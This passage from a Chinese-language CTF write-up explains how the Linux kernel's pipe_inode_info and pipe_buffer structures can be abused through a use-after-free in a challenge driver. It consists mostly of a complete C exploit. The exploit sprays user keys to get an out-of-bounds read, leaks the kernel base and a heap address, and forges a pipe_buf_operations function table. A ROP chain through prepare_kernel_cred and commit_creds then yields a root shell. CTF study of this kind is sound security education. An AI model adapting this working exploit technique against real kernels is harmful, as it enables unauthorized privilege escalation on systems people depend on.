来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;<span class="comment">//该结构体使用kmalloc-192分配</span></span><br></pre></td></tr></table></figure><p>可以看到其中有一个bufs指针指向一个<code>struct pipe_buffer</code>，每个 <code>pipe_buffer</code> 结构体对应一张用以存储数据的内存页,虽然这个结构体不大,但是slab分配时会分配1024大小的obj</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>pipe_buf_operations</code> 为一张函数表，当我们对管道进行特定操作时内核便会调用该表上对应的函数，例如当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，由此我们便能控制内核执行流，从而完成提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment"> * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment"> * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment"> * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment"> * error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment"> * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment"> * -&gt;steal() returns 0 for success, in which case the contents</span></span><br><span class="line"><span class="comment"> * of the pipe (the buf-&gt;page) is locked and now completely owned</span></span><br><span class="line"><span class="comment"> * by the caller. The page may then be transferred to a different</span></span><br><span class="line"><span class="comment"> * mapping, the most often used case is insertion into different</span></span><br><span class="line"><span class="comment"> * file address space cache.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> (*steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么这里我们可以利用 UAF 使得 <code>user_key_payload</code> 与 <code>pipe_inode_info</code> 占据同一个 object， <code>pipe_inode_info</code> 刚好会将 <code>user_key_payload-&gt;datalen</code> 改为 <code>0xFFFF</code> (这个字段应该是一个指针,至于为什么会是ffff不太清除使得我们能够继续读取数据,为了能够泄露数据肯定是个先用其uaf <code>user_key_payload</code>再uaf<code>pipe_inode_info</code>，从而读取 <code>pipe_inode_info</code> 以<u>泄露出 <code>pipe_buffer</code> 的地址。</u></p><p>而 <code>pipe_buffer</code> 是动态分配的，因此我们可以利用题目功能预先分配一个对象作为 <code>pipe_buffer</code> 并直接uaf在其上伪造函数表即可。</p><p>最终<strong>exp</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* kmalloc-192 has only 21 objects on a slub, we don&#x27;t need to spray to many */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_SPRAY_NUM 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SZ 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SZ 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff81096110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ed0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XCHG_RDI_RAX_DEC_STH_RET 0xffffffff81adfc70</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> idx;</span><br><span class="line">    <span class="type">uint32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief allocate an object bby kmalloc(size, __GFP_ZERO | GFP_KERNEL )</span></span><br><span class="line"><span class="comment"> * __GFP_RECLAIM = __GFP_KSWAPD_RECLAIM | __GFP_DIRECT_RECLAIM </span></span><br><span class="line"><span class="comment"> * GFP_KERNEL = __GFP_RECLAIM | __GFP_IO | __GFP_FS</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param idx </span></span><br><span class="line"><span class="comment"> * @param size </span></span><br><span class="line"><span class="comment"> * @param buf </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">uint32_t</span> idx, <span class="type">uint32_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">uint32_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf, pipe_buffer_addr;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bindCore(<span class="number">0</span>);</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to open the /dev/rwctf file!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on user_key_payload */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;<span class="comment">//KEY_SPRAY_NUM不一定非得是40,只要能使得耗尽两个slab即可</span></span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;arttnba&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;FAILED to add_key()!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);<span class="comment">//uaf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* corrupt user_key_payload&#x27;s header */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] corrupting user_key_payload...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);<span class="comment">//不太清楚为什么要循环这么多次,按照道理LIFO,第一个就应该是刚才del的0啊</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for oob-read and leak kernel base */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] try to make an OOB-read...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;<span class="comment">//如果读了超过192个字符,那么就说明其是victim,否则的话将其销毁置函数指针</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED at corrupt user_key_payload!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2000</span> / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (buf[i] &gt; kernel_base &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x210</span>) &#123;</span><br><span class="line">            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">            kernel_base += kernel_offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;<span class="comment">//在读出来的内容中,挨个判断是否大于kernel_base并且以0x210结尾,是的话就基本确定其是所要的函数指针了,又一个疑问,这里其实有一定概率读出来的内容中并不存在函数指针的,例如目标obj位于slab的最后位置,而且就算确定有,那也是先读再销毁产生函数指针,靠Random freelist???</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kernel_offset == <span class="number">-1</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;FAILED to leak kernel addr!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF on pipe_inode_buffer to leak pipe_buffer&#x27;s addr */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 0-&gt;1-&gt;..., the 1 will be the payload object */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;arttnba3pipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* this object is for the pipe buffer */</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);<span class="comment">//uaf PIPE_INODE_INFO and key_user_payload</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* note that the user_key_payload-&gt;datalen is 0xFFFF now */</span></span><br><span class="line">    retval = key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>]; <span class="comment">/* pipe_inode_info-&gt;bufs得到pipe_buffer的地址 */</span>/</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got pipe_buffer: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">            pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct fake pipe_buf_operations */</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">/* pipe_buffer-&gt;ops,是函数指针表指向buffer内部 */</span></span><br><span class="line">    <span class="comment">/* after release(), we got back here */</span></span><br><span class="line">    buf[<span class="number">3</span>] = kernel_offset + POP_RBX_POP_RBP_POP_R12_RET;</span><br><span class="line">    <span class="comment">/* pipe_buf_operations-&gt;release */</span></span><br><span class="line">    buf[<span class="number">4</span>] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET;<span class="comment">//函数指针调用时第二个参数rsi就是buffer,所以之后才会又回到buf[3]</span></span><br><span class="line">    buf[<span class="number">5</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    buf[<span class="number">8</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = kernel_offset + PREPARE_KERNEL_CRED;</span><br><span class="line">    buf[<span class="number">10</span>] = kernel_offset + XCHG_RDI_RAX_DEC_STH_RET;</span><br><span class="line">    buf[<span class="number">11</span>] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    buf[<span class="number">12</span>] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = getRootShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; <span class="comment">/* system() wants it : ( */</span></span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);<span class="comment">//uaf pipe_buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger pipe_buf_operations-&gt;release */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="kernel密钥管理接口"><a href="#kernel密钥管理接口" class="headerlink" 